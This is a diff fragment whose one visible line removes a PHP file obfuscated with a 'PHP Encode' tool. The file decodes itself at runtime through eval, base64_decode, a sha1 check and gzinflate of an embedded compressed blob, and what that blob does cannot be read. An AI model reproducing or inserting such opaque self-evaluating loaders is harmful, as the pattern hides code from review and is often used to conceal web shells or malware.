@@ -1,1 +1,1367 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=d0bbaa3b59b999b1a967118033ab928d8591a142nT2JctvGkr/CUjlla+NI4gWQsaW1nThOtpQ4a9nvbVWcUhEXCRIESQC8lOjfF93TPQcwAJVXiSyKJObo6fuaZ3+dfT0M3PLH/1j+03sLr+7OHv84m309uO5hV/47+npwxrNp+WqyL1/24rM/r+GpIXz362EYlb+D8lP4G77bFX/DjwPvDc5ePRPT3Jb/wLd75U+3/GPYh5nKR8tHnEH528lgnJRmcHpiNLdf/vZhFeWPJ0eTi4bRaC04YFh+zYHHV/BMFtGTPRrVi5ewMhznAw7yrjpC+TnM6QEMYOJ+uXH3Cmcvx5iJjTm0anjt9sRwuMN3b7W9OaOHtdih26MtuWIhLiwKFucbW2IYqaPwYJ4AwDmimSPaykCM4PZPAwXmnhBgwpXYjjsQY5bP03gTerNbG9Q4OlzWDpaeCFDhQzC0U9AfIZ9hIlCDAK4P966CBggc2GxI8He09wbGEifNINPGc+inX8AgPiEa4YEL0/C5tY0y8WlJAf2MYYAdH3xMJ+nA7/polnNwBFG5jkBM9yoBjJqkNI1DO+0TejA6j0sS7F85dWoyFjz3FNAQZfl08ISSGQwOG4pSpItp+ZV+hULfGQMmhHPuAjYID0UBDQtHoa+2ywCCVc/E8vu9yuBVgKQMESRU50Bo7k1pYCdOTHI1RrkjmAIDcmnXI9r5eFMg3TLmrJa0RlxfI3ZXj3+S7uig4LlRRszIW8G48NcwQZxcETaU1NlOz4TRsNzQI77QZ8aCMPSYMxBfHMDJdzWOpa+Vx5zQmP2AqHu4XhujEmJEiT5q+dO3wPZWXynzwtED4rgA50gfdmWMqTNDy0rF4dC4Y5IwgcJ4pFLmH4GSASgHkOFGNHff4CuN4sUlBIGvBwuaZODRqN0qBsc6+nYt6KuPDZTppTDMPAt4pJVOtuJYENLj9sGcYL2lpXbncPxLcWRur4klaGOPWhFaP84RIQuSakLwR54wMzYQVWZw1errCBhGfEBbOOGYVooiVPIcHDXWhmw6PMaU7pTYLFDYeOqtiFwCOJ5RI6O86p+glR5rM8AruvmB3nJDjV/Y+a9NYNxqJOg6R6IzlqUw5hjnWpqAEEvtnj63mFYzEKIUGRy8HhW01LG2TKUPNCo3KI9ZoRo+EExdYvT9qcdkHjAiR0LPc7qg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